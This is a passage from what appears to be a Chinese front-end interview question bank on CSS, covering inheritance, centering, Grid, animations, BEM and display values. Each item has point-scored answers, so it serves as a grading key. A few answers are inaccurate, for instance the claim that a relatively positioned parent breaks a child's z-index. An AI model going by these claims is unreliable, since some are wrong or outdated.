CSS哪些属性可以继承</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（5 分）</h4>\\n<details>\\n\\n<ul>\\n<li><p><strong>1：</strong> 不可继承的</p>\\n<ul>\\n<li><p>display\\n指定元素的显示方式，常见的值包括：\\nblock：块级元素，占据整行\\ninline：行内元素，只占据必要的宽度，不换行\\ninline-block：结合了 inline 和 block 的特性\\nnone：隐藏元素</p>\\n</li>\\n<li><p>margin\\n设置元素外部的空白区域，即元素与其他元素之间的距离</p>\\n</li>\\n<li><p>border\\n设置元素的边框可以指定边框的宽度、样式和颜色</p>\\n</li>\\n<li><p>padding\\n设置元素内容与边框之间的内边距，控制元素内部的空白区域</p>\\n</li>\\n<li><p>background\\n设置元素的背景，包括背景颜色、背景图像等</p>\\n</li>\\n<li><p>height\\n指定元素的高度</p>\\n</li>\\n<li><p>min-height\\n设置元素的最小高度，元素的高度不能小于此值</p>\\n</li>\\n<li><p>max-height\\n设置元素的最大高度，元素的高度不能超过此值</p>\\n</li>\\n<li><p>width\\n指定元素的宽度</p>\\n</li>\\n<li><p>min-width\\n设置元素的最小宽度，元素的宽度不能小于此值</p>\\n</li>\\n<li><p>max-width\\n设置元素的最大宽度，元素的宽度不能超过此值</p>\\n</li>\\n<li><p>overflow\\n控制当内容溢出元素的边界时如何显示常见的值：\\n  visible：内容溢出时可见\\n  hidden：内容溢出时隐藏\\n  scroll：出现滚动条\\n  auto：根据需要自动显示滚动条</p>\\n</li>\\n<li><p>position\\n设置元素的定位方式常见的值：\\n  static：默认值，元素按文档流排列\\n  relative：相对定位，元素相对于其原始位置偏移\\n  absolute：绝对定位，元素相对于最近的已定位祖先元素定位\\n  fixed：固定定位，元素相对于浏览器窗口定位\\n  sticky：粘性定位，元素在滚动到特定位置时变为固定定位</p>\\n</li>\\n<li><p>top, bottom, left, right\\n当元素使用 position 定位时，指定元素相对于其定位上下文的偏移量</p>\\n</li>\\n<li><p>z-index\\n控制重叠元素的堆叠顺序，值越大的元素会覆盖值较小的元素仅对定位元素有效</p>\\n</li>\\n<li><p>float\\n指定元素是否浮动（通常用于让文本环绕图片等）常见的值：\\n  left：元素向左浮动\\n  right：元素向右浮动\\n  none：取消浮动</p>\\n</li>\\n<li><p>clear\\n控制元素周围浮动元素的行为，通常与 float 一起使用常见的值：\\n  left：禁止元素左侧有浮动元素\\n  right：禁止元素右侧有浮动元素\\n  both：禁止元素两侧有浮动元素\\n  none：允许两侧都有浮动元素</p>\\n</li>\\n<li><p>table-layout\\n控制表格布局的算法常见的值：\\n  auto：浏览器根据内容调整列宽（默认）\\n  fixed：浏览器根据表格的宽度固定列宽</p>\\n</li>\\n<li><p>vertical-align\\n控制元素在垂直方向上的对齐方式常见的值：\\n  top：元素顶部对齐\\n  middle：元素垂直居中对齐\\n  bottom：元素底部对齐</p>\\n</li>\\n<li><p>page-break-after\\n控制分页符的位置常见的值：\\n  auto：默认，自动决定分页\\n  always：强制分页\\n  avoid：避免分页</p>\\n</li>\\n<li><p>page-break-before\\n与 page-break-after 类似，控制元素前面的分页符</p>\\n</li>\\n<li><p>unicode-bidi\\n控制文本的双向性，通常与 direction 属性一起使用，用于处理多语言文本的显示常见的值：\\n  normal：正常的双向文本布局\\n  embed：强制嵌入的文本遵循本地的方向性\\n  bidi-override：覆盖文本的方向性，强制使用 direction 属性的值</p>\\n</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 所有元素可继承的</p>\\n<ul>\\n<li><p>visibility\\nvisibility 属性控制元素的可见性，与 display: none 不同，使用 visibility: hidden 隐藏元素时，元素依然占据空间，但不可见；\\n常见值包括：\\n  visible（默认值）：元素是可见的\\n  hidden：元素不可见，但仍然占据空间\\n  collapse：用于表格元素时，隐藏元素并且不占据空间（与 hidden 类似，但通常用于 <code>&lt;tr&gt;、&lt;th&gt;、&lt;td&gt;</code> 等表格元素）</p>\\n</li>\\n<li><p>cursor\\ncursor 属性控制鼠标指针在元素上的样式，通常用于改变鼠标悬停在某个元素上时的外观；\\n常见值包括：\\n  auto：默认指针，浏览器根据上下文决定指针样式\\n  pointer：显示手形指针，通常用于可点击的链接或按钮\\n  default：默认的光标样式\\n  none：隐藏鼠标指针\\n  wait：显示一个旋转的沙漏或类似的等待指针，表示操作正在进行\\n  move：显示一个四向箭头，表示可以移动元素\\n  text：显示文本光标，通常用于文本输入区域\\n  not-allowed：显示禁用的指针，通常表示该操作不可用\\n  help：显示问号光标，通常表示需要帮助的地方</p>\\n</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 终极块级元素可继承的</p>\\n<ul>\\n<li><p>text-indent\\ntext-indent 用于控制文本的首行缩进；这个属性通常应用于块级元素，如 <code>&lt;p&gt;、&lt;div&gt;</code> 等，控制块内文本的缩进量；常见值：\\n  length：指定缩进的距离，例如 20px 或 2em\\n  %：表示缩进的百分比，基于元素的宽度\\n  initial：将属性恢复为默认值</p>\\n</li>\\n<li><p>text-align\\ntext-align 用于设置块级元素内文本的对齐方式，可以控制文本或内联元素在其父容器中的水平对齐，常见值：\\n  left：将文本对齐到左边\\n  right：将文本对齐到右边\\n  center：将文本居中\\n  justify：将文本两端对齐，通常用于段落，使得文本两端都紧贴容器\\n  start 和 end：依据书写方向（左到右或右到左）自动决定对齐方式</p>\\n</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 内联元素可继承的</p>\\n<ul>\\n<li><p>letter-spacing\\nletter-spacing 用于设置文本中字符之间的间距。它控制字母之间的距离，可以让文本看起来更加紧凑或更加宽松，常见值：\\n  normal：默认的字符间距，通常为 0\\n  length：指定字符间的间距，可以使用单位如 px、em、rem 等。例如，2px 或 0.1em</p>\\n</li>\\n<li><p>word-spacing\\nword-spacing 用于设置单词之间的间距。它控制单词之间的空白区域，可以增加或减少单词间的空隙。\\n常见值：\\n  normal：默认的单词间距。\\n  length：指定单词间距，可以使用 px、em、rem 等单位。</p>\\n</li>\\n<li><p>white-space\\nwhite-space 用于控制元素内文本的空白字符处理方式。它决定了文本中的空格、换行等如何展示；常见值：\\n  normal：默认值，连续空白字符会合并为一个空格，文本会自动换行\\n  nowrap：文本不会换行，所有空白字符会被合并为一个空格\\n  pre：保留空格和换行符，类似于 <code>&lt;pre&gt;</code> 标签的效果\\n  pre-wrap：保留空格和换行符，文本会自动换行\\n  pre-line：合并多个空白字符，但保留换行符</p>\\n</li>\\n<li><p>line-height\\nline-height 用于设置文本行与行之间的垂直间距。它控制行之间的间隔，通常用于改善文本的可读性；常见值：\\n  normal：默认的行高，通常为字体大小的 1.2 倍。\\n  number：指定行高为字体大小的倍数。\\n  length：指定固定的行高值，如 20px、1.5em。\\n  percentage：指定行高为字体大小的百分比。</p>\\n</li>\\n<li><p>color\\ncolor 用于设置文本的颜色，常见值：\\n  color：任何有效的颜色值，例如 red、#ff0000、rgb(255, 0, 0)、rgba(255, 0, 0, 0.5)。</p>\\n</li>\\n<li><p>font</p>\\n<p>font 是一个简写属性，用于设置字体相关的多个属性。它可以同时设置字体系列、字体样式、字体粗细、字体大小等；常见值：\\n  font-style、font-variant、font-weight、font-size、line-height、font-family</p>\\n</li>\\n<li><p>font-size\\nfont-size 用于设置文本的大小；常见值：\\n  length：如 12px、1em、0.75rem。\\n  percentage：相对于父元素的字体大小，如 150%。\\n  medium：默认字体大小。\\n  larger / smaller：相对于父元素字体大小的大小调整。</p>\\n</li>\\n<li><p>font-style\\nfont-style 用于设置文本的样式，通常用于斜体文本；常见值：\\n  normal：正常样式\\n  italic：斜体\\n  oblique：倾斜字体，通常与 italic 类似，但不是正式的斜体字形</p>\\n</li>\\n<li><p>font-variant\\nfont-variant 用于控制文本是否使用变体字体；常见值：\\n  normal：正常字体。\\n  small-caps：小型大写字母，通常用于显示大写字母，但它们比普通大写字母小。</p>\\n</li>\\n<li><p>font-weight\\nfont-weight 用于设置文本的粗细；常见值：\\n  normal：正常的字体粗细\\n  bold：加粗字体\\n  bolder：比父元素更粗\\n  lighter：比父元素更细\\n  number：可以指定 100 到 900 之间的数值，例如 400 是正常粗细，700 是加粗</p>\\n</li>\\n<li><p>text-decoration\\ntext-decoration 用于设置文本的装饰效果，如下划线、删除线等；常见值：\\n  none：无装饰\\n  underline：下划线\\n  overline：上划线\\n  line-through：删除线\\n  blink：闪烁的文本（大多数浏览器已不支持）</p>\\n</li>\\n<li><p>text-transform\\ntext-transform 用于控制文本的大小写转换；常见值：\\n  none：不转换大小写\\n  capitalize：将每个单词的首字母转换为大写\\n  uppercase：将所有字母转换为大写\\n  lowercase：将所有字母转换为小写</p>\\n</li>\\n<li><p>direction\\ndirection 用于设置文本的书写方向；常见值：\\n  ltr：从左到右（默认）\\n  rtl：从右到左，通常用于阿拉伯语、希伯来语等语言</p>\\n</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 列表元素可继承的属性</p>\\n<ul>\\n<li><p>list-style\\nlist-style 是一个简写属性，用于设置列表项的标记类型、位置等。它同时设置 list-style-type、list-style-position 和 list-style-image；常见值：\\n  list-style-type：标记类型，如 disc、circle、square、decimal、none 等。\\n  list-style-position：标记的位置，inside 或 outside。\\n  list-style-image：指定列表项标记为图片。</p>\\n</li>\\n<li><p>list-style-type\\nlist-style-type 用于设置列表项的标记类型；常见值：\\n  disc：实心圆点（默认）\\n  circle：空心圆点\\n  square：方块\\n  decimal：数字列表（如 1, 2, 3）\\n  none：没有标记</p>\\n</li>\\n<li><p>list-style-position\\nlist-style-position 用于设置列表标记的位置；常见值：\\n  outside：标记在列表项外部（默认）\\n  inside：标记在列表项内部</p>\\n</li>\\n<li><p>list-style-image\\nlist-style-image 用于设置列表项标记为自定义图像；常见值：<code>url(&lt;image-url&gt;)：指定图像的 URL，如 url(&#39;bullet.png&#39;)</code></p>\\n</li>\\n</ul>\\n</li>\\n</ul>\\n</details>\\n\\n<h2>16. CSS 性能优化</h2>\\n<h4>类型：<code>拓展</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（4 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 合并与压缩 CSS 文件：减少文件体积，降低网络传输时间，如使用工具将多个 CSS 文件合并为一个并压缩代码。</li>\\n<li><strong>1：</strong> 合理使用选择器：避免复杂嵌套，保持选择器简单高效，如.parent &gt;.child比.parent.class1.class2 &gt;.child性能更好。</li>\\n<li><strong>1：</strong> 优化图片资源：使用合适的图片格式与尺寸，对于小图标可考虑使用雪碧图或字体图标，减少 HTTP 请求。</li>\\n<li><strong>1：</strong> 利用 CSS 继承：将可继承的属性设置在父元素，减少重复声明，如color、font - family等。</li>\\n</ul>\\n<h2>17. CSS3中有哪些新特性</h2>\\n<h4>类型：<code>拓展</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><p>新增各种CSS选择器 （: not(.input)：所有 class 不是“input”的节点）</p>\\n</li>\\n<li><p>圆角 （border-radius:8px）</p>\\n</li>\\n<li><p>多列布局 （multi-column layout）</p>\\n</li>\\n<li><p>阴影和反射 （box-shadow 和 reflect）</p>\\n</li>\\n<li><p>文字特效 （text-shadow）</p>\\n</li>\\n<li><p>线性渐变 （gradient）</p>\\n</li>\\n<li><p>旋转 （transform）</p>\\n</li>\\n<li><p>媒体查询 （@media）</p>\\n</li>\\n<li><p>2D、3D 转换和动画</p>\\n</li>\\n</ul>\\n<h2>18. 单行、多行文本溢出隐藏</h2>\\n<h4>类型：<code>拓展</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li>单行文本溢出</li>\\n</ul>\\n<pre><code class=\\"language-css\\">overflow: hidden;            // 溢出隐藏\\ntext-overflow: ellipsis;      // 溢出用省略号显示\\nwhite-space: nowrap;         // 规定段落中的文本不进行换行\\n</code></pre>\\n<ul>\\n<li>多行文本溢出</li>\\n</ul>\\n<pre><code class=\\"language-css\\">display: -webkit-box;         // 作为弹性伸缩盒子模型显示\\n-webkit-box-orient: vertical; // 设置伸缩盒子的子元素排列方式--从上到下垂直排列\\n-webkit-line-clamp: 3;        // 显示的行数\\noverflow: hidden;             // 溢出隐藏\\n</code></pre>\\n<h2>19. Sass、Less 是什么？为什么要使用他们？</h2>\\n<h4>类型：<code>拓展</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><p>他们都是 CSS 预处理器，是 CSS 上的一种抽象层。他们是一种特殊的语法/语言编译成 CSS。 例如 Less 是一种动态样式语言，将 CSS 赋予了动态语言的特性，如变量，继承，运算， 函数，LESS 既可以在客户端上运行 (支持 IE 6+, Webkit, Firefox)，也可以在服务端运行 (借助 Node.js)。</p>\\n</li>\\n<li><p>为什么要使用它们？</p>\\n</li>\\n<li><p>结构清晰，便于扩展。 可以方便地屏蔽浏览器私有语法差异。封装对浏览器语法差异的重复处理， 减少无意义的机械劳动。</p>\\n</li>\\n<li><p>可以轻松实现多重继承。 完全兼容 CSS 代码，可以方便地应用到老项目中。 减少代码量，提高开发效率。</p>\\n</li>\\n</ul>\\n<h2>20. z-index属性在什么情况下会失效?</h2>\\n<h4>类型：<code>拓展</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p>通常 z-index 的使用是在有两个重叠的标签，在一定的情况下控制其中一个在另一个的上方或者下方出现。z-index值越大就越是在上层。z-index元素的position属性需要是relative，absolute或是fixed。</p>\\n</li>\\n<li><p>父元素position为relative时，子元素的z-index失效。解决：父元素position改为absolute或static；</p>\\n</li>\\n<li><p>元素没有设置position属性为非static属性。解决：设置该元素的position属性为relative，absolute或是fixed中的一种；</p>\\n</li>\\n<li><p>元素在设置z-index的同时还设置了float浮动。解决：float去除，改为display：inline-block；</p>\\n</li>\\n</ul>\\n<h2>21. 如何根据设计稿进行移动端适配？</h2>\\n<h4>类型：<code>拓展</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p>移动端适配主要有两个维度：</p>\\n</li>\\n<li><p>适配不同像素密度， 针对不同的像素密度，使用 CSS 媒体查询，选择不同精度的图片，以保证图片不会失真；</p>\\n</li>\\n<li><p>适配不同屏幕大小， 由于不同的屏幕有着不同的逻辑像素大小，所以如果直接使用 px 作为开发单位，会使得开发的页面在某一款手机上可以准确显示，但是在另一款手机上就会失真。为了适配不同屏幕的大小，应按照比例来还原设计稿的内容。</p>\\n</li>\\n<li><p>为了能让页面的尺寸自适应，可以使用 rem，em，vw，vh 等相对单位。</p>\\n</li>\\n</ul>\\n<h2>22 .实现一个扇形</h2>\\n<h4>类型：<code>拓展</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li>用CSS实现扇形的思路和三角形基本一致，就是多了一个圆角的样式，实现一个90°的扇形：</li>\\n</ul>\\n<pre><code class=\\"language-css\\">div{\\n    border: 100px solid transparent;\\n    width: 0;\\n    heigt: 0;\\n    border-radius: 100px;\\n    border-top-color: red;\\n}\\n</code></pre>\\n<h2>23. 画一条0.5px的线</h2>\\n<h4>类型：<code>拓展</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li>采用transform: scale()的方式，该方法用来定义元素的2D 缩放转换：</li>\\n</ul>\\n<pre><code class=\\"language-css\\">transform: scale(0.5,0.5);\\n</code></pre>\\n<ul>\\n<li>采用meta viewport的方式</li>\\n</ul>\\n<pre><code class=\\"language-html\\">&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=0.5, minimum-scale=0.5, maximum-scale=0.5&quot;/&gt;\\n</code></pre>\\n<h2>24. 对 sticky 定位的理解</h2>\\n<h4>类型：<code>拓展</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p>sticky 英文字面意思是粘贴，所以可以把它称之为粘性定位。语法：position: sticky; 基于用户的滚动位置来定位。</p>\\n</li>\\n<li><p>粘性定位的元素是依赖于用户的滚动，在 position:relative 与 position:fixed 定位之间切换。它的行为就像 position:relative; 而当页面滚动超出目标区域时，它的表现就像 position:fixed;，它会固定在目标位置。元素定位表现为在跨越特定阈值前为相对定位，之后为固定定位。这个特定阈值指的是 top, right, bottom 或 left\\n之一，换言之，指定 top, right, bottom 或 left 四个阈值其中之一，才可使粘性定位生效。否则其行为与相对定位相同。</p>\\n</li>\\n</ul>\\n<h2>25. display:inline-block 什么时候会显示间隙？</h2>\\n<h4>类型：<code>拓展</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p>有空格时会有间隙，可以删除空格解决；</p>\\n</li>\\n<li><p>margin正值时，可以让margin使用负值解决；</p>\\n</li>\\n<li><p>使用font-size解决，给父元素设置font-size:0，子元素再设置font-size；</p>\\n</li>\\n</ul>\\n<h2>26. ::before 和 :after 的双冒号和单冒号有什么区别？</h2>\\n<h4>类型：<code>拓展</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li>冒号(:)用于CSS3伪类，双冒号(::)用于CSS3伪元素。 （2）::before就是以一个子元素的存在，定义在元素主体内容之前的一个伪元素。并不存在于dom之中，只存在在页面之中。</li>\\n</ul>\\n<h2>27. CSS 居中</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（4 分）</h4>\\n<details>\\n\\n<ul>\\n<li><strong>1：定位居中</strong></li>\\n</ul>\\n<p>①已知大小的元素在屏幕窗口水平垂直都居中</p>\\n<pre><code class=\\"language-html\\">&lt;!DOCTYPE html&gt;\\n&lt;html lang=&quot;en&quot;&gt;\\n&lt;head&gt;\\n    &lt;meta charset=&quot;UTF-8&quot;&gt;\\n    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;\\n    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt;\\n    &lt;title&gt;&lt;/title&gt;\\n    &lt;style&gt;\\n        .box{\\n            width:100px;\\n            height:100px;\\n            background-color: aqua;\\n            position:fixed;\\n            left:50%;\\n            top:50%;\\n            margin-left:-50px;\\n            margin-top:-50px;\\n        }\\n    &lt;/style&gt;\\n&lt;/head&gt;\\n&lt;body&gt;\\n    &lt;div class=&quot;box&quot;&gt;\\n\\n    &lt;/div&gt;\\n&lt;/body&gt;\\n&lt;/html&gt;\\n</code></pre>\\n<p>②未知大小的元素在屏幕窗口水平垂直都居中</p>\\n<pre><code class=\\"language-html\\">&lt;!DOCTYPE html&gt;\\n&lt;html lang=&quot;en&quot;&gt;\\n&lt;head&gt;\\n    &lt;meta charset=&quot;UTF-8&quot;&gt;\\n    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;\\n    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt;\\n    &lt;title&gt;&lt;/title&gt;\\n    &lt;style&gt;\\n        .box{\\n            position:fixed;\\n            left:0;\\n            top:0;\\n            right:0;\\n            bottom:0;\\n            margin:auto;\\n        }\\n    &lt;/style&gt;\\n&lt;/head&gt;\\n&lt;body&gt;\\n    &lt;div class=&quot;box&quot;&gt;\\n\\n    &lt;/div&gt;\\n&lt;/body&gt;\\n&lt;/html&gt;\\n</code></pre>\\n<ul>\\n<li><strong>1：子元素在父元素中居中</strong></li>\\n</ul>\\n<p>①已知大小的子元素在父元素中居中</p>\\n<pre><code class=\\"language-css\\">    父元素{\\n        /* 相对定位 */\\n        position: relative;\\n    }\\n    子元素{\\n        width:100px;\\n        height:100px;\\n        /* 绝对定位 */\\n        position:absolute;\\n        left:50%;\\n        top:50%;\\n        margin-left:-50px;\\n        margin-top:-50px;\\n    }\\n</code></pre>\\n<p>②未知大小的子元素在父元素中居中</p>\\n<pre><code class=\\"language-css\\">  父元素{\\n      /* 相对定位 */\\n      position: relative;\\n  }\\n  子元素{\\n      /* 绝对定位 */\\n      position:absolute;\\n      left:0;\\n      top:0;\\n      right:0;\\n      bottom:0;\\n      margin:auto;\\n  }\\n</code></pre>\\n<ul>\\n<li><strong>1：使用弹性布局</strong></li>\\n</ul>\\n<p>① 使用flex布局的方式实现未知大小元素在屏幕窗口水平垂直都居中</p>\\n<pre><code class=\\"language-css\\">  html,body{\\n      height:100%;\\n  }\\n  /* 让html和body的高度为屏幕窗口的高度（窗口高度自适应） */\\n  body{\\n      display:flex;\\n      justify-content:center;\\n      align-items:center;\\n  }\\n</code></pre>\\n<p>② 使用flex布局的方式实现未知大小的子元素在父元素中水平垂直都居中**</p>\\n<pre><code class=\\"language-css\\">  父元素 {\\n      display:flex;\\n      justify-content:center;\\n      align-items:center;\\n  }\\n    \\n</code></pre>\\n<ul>\\n<li><strong>1：使用css3变形来实现</strong></li>\\n</ul>\\n<p>① 使用css3变形的方式实现未知大小的元素在屏幕窗口水平垂直都居中</p>\\n<pre><code class=\\"language-css\\">  元素{\\n      position:fixed;\\n      left:50%;\\n      top:50%;\\n      transform:translateX(-50%) translateY(-50%);\\n  }\\n</code></pre>\\n<p>② 使用css变形的方式来实现未知大小的子元素，在父元素中水平垂直都居中</p>\\n<pre><code class=\\"language-css\\">  父元素{\\n      position:relative;\\n  }\\n  子元素{\\n      position:absolute;\\n      left:50%;\\n      top:50%;\\n      transform:translate(-50%,-50%);\\n  }\\n</code></pre>\\n</details>\\n\\n<h2>28. CSS Grid 布局的基本概念和使用方法是什么？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（4 分）</h4>\\n<details>\\n\\n<ul>\\n<li><p><strong>2：</strong> Grid布局的基本概念：</p>\\n<ul>\\n<li>Grid Container：设置 display: grid 的元素</li>\\n<li>Grid Item：Grid Container 的直接子元素</li>\\n<li>Grid Line：构成网格结构的分界线</li>\\n<li>Grid Track：两条相邻网格线之间的空间</li>\\n<li>Grid Cell：网格中的单元格</li>\\n<li>Grid Area：任意数量的网格单元格组成的区域</li>\\n</ul>\\n</li>\\n<li><p><strong>2：</strong> 基本使用示例：</p>\\n</li>\\n</ul>\\n<pre><code class=\\"language-css\\">.container {\\n    display: grid;\\n    /* 定义列的大小和数量 */\\n    grid-template-columns: 100px 100px 100px;\\n    /* 定义行的大小和数量 */\\n    grid-template-rows: 100px 100px;\\n    /* 设置间距 */\\n    gap: 10px;\\n}\\n\\n.item {\\n    /* 指定元素位置 */\\n    grid-column: 1 / 3; /* 从第1条网格线到第3条网格线 */\\n    grid-row: 1 / 2;    /* 从第1条网格线到第2条网格线 */\\n}\\n</code></pre>\\n</details>\\n\\n<h2>29. CSS 动画和过渡的区别是什么？如何使用它们？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（6 分）</h4>\\n<details>\\n\\n<ul>\\n<li><strong>2：</strong> 过渡（Transition）：<ul>\\n<li>从一个状态到另一个状态的平滑过渡</li>\\n<li>需要触发条件（如hover）</li>\\n<li>只能定义开始和结束状态</li>\\n</ul>\\n</li>\\n</ul>\\n<pre><code class=\\"language-css\\">.element {\\n    width: 100px;\\n    transition: width 0.3s ease;\\n}\\n\\n.element:hover {\\n    width: 200px;\\n}\\n</code></pre>\\n<ul>\\n<li><strong>2：</strong> 动画（Animation）：<ul>\\n<li>可以定义多个状态的变化</li>\\n<li>可以循环播放</li>\\n<li>可以自动播放，无需触发条件</li>\\n</ul>\\n</li>\\n</ul>\\n<pre><code class=\\"language-css\\">@keyframes slide {\\n    0% {\\n        transform: translateX(0);\\n    }\\n    50% {\\n        transform: translateX(100px);\\n    }\\n    100% {\\n        transform: translateX(0);\\n    }\\n}\\n\\n.element {\\n    animation: slide 2s ease infinite;\\n}\\n</code></pre>\\n<ul>\\n<li><strong>2：</strong> 主要区别：<ul>\\n<li>触发方式：过渡需要触发条件，动画可以自动播放</li>\\n<li>状态数量：过渡只有开始和结束两个状态，动画可以有多个状态</li>\\n<li>循环播放：动画可以循环播放，过渡不能</li>\\n<li>控制能力：动画的控制能力更强，可以精确控制中间状态</li>\\n</ul>\\n</li>\\n</ul>\\n</details>\\n\\n<h2>30. CSS 中的 BEM 命名规范是什么？为什么要使用它？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（4 分）</h4>\\n<details>\\n\\n<ul>\\n<li><strong>2：</strong> BEM 命名规范：<ul>\\n<li>Block（块）：独立的组件，如 <code>.button</code></li>\\n<li>Element（元素）：属于块的一部分，用 <code>__</code> 连接，如 <code>.button__text</code></li>\\n<li>Modifier（修饰符）：改变块或元素的外观或行为，用 <code>--</code> 连接，如 <code>.button--large</code></li>\\n</ul>\\n</li>\\n</ul>\\n<pre><code class=\\"language-css\\">/* Block */\\n.card {\\n    padding: 20px;\\n}\\n\\n/* Element */\\n.card__title {\\n    font-size: 18px;\\n}\\n\\n/* Element */\\n.card__content {\\n    margin-top: 10px;\\n}\\n\\n/* Modifier */\\n.card--featured {\\n    background: #f0f0f0;\\n}\\n</code></pre>\\n<ul>\\n<li><strong>2：</strong> 使用BEM的好处：<ul>\\n<li>提高代码的可读性和可维护性</li>\\n<li>避免CSS选择器嵌套过深</li>\\n<li>减少命名冲突</li>\\n<li>明确表达组件结构和关系</li>\\n<li>方便团队协作和代码复用</li>\\n</ul>\\n</li>\\n</ul>\\n</details>\\n\\n<h2>31. display的block、inline和inline-block的区别</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<p>block： 会独占一行，多个元素会另起一行，可以设置width、height、margin和padding属性；</p>\\n<p>inline： 元素不会独占一行，设置width、height属性无效。但可以设置水平方向的margin和padding属性，不能设置垂直方向的padding和margin；</p>\\n<p>inline-block： 将对象设置为inline对象，但对象的内容作为block对象呈现，之后的内联对象会被排列在同一行内。</p>\\n<h2>32. link和@import的区别</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<p>两者都是外部引用CSS的方式，它们的区别如下：</p>\\n<ul>\\n<li><p>link是XHTML标签，除了加载CSS外，还可以定义RSS等其他事务；@import属于CSS范畴，只能加载CSS。</p>\\n</li>\\n<li><p>link引用CSS时，在页面载入时同时加载；@import需要页面网页完全载入以后加载。</p>\\n</li>\\n<li><p>link是XHTML标签，无兼容问题；@import是在CSS2.1提出的，低版本的浏览器不支持。</p>\\n</li>\\n<li><p>link支持使用Javascript控制DOM去改变样式；而@import不支持。</p>\\n</li>\\n</ul>\\n<h2>33. transition和animation的区别</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<p>transition是过度属性，强调过度，它的实现需要触发一个事件（比如鼠标移动上去，焦点，点击等）才执行动画。它类似于flash的补间动画，设置一个开始关键帧，一个结束关键帧。</p>\\n<p>animation是动画属性，它的实现不需要触发事件，设定好时间之后可以自己执行，且可以循环一个动画。它也类似于flash的补间动画，但是它可以设置多个关键帧（用@keyframe定义）完成动画。</p>\\n<h2>34. display:none与visibility:hidden的区别</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<p>这两个属性都是让元素隐藏，不可见。两者区别如下：</p>\\n<p>display:none会让元素完全从渲染树中消失，渲染时不会占据任何空间；</p>\\n<p>visibility:hidden不会让元素从渲染树中消失，渲染的元素还会占据相应的空间，只是内容不可见。</p>\\n<h2>35. 伪元素和伪类的区别和作用？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 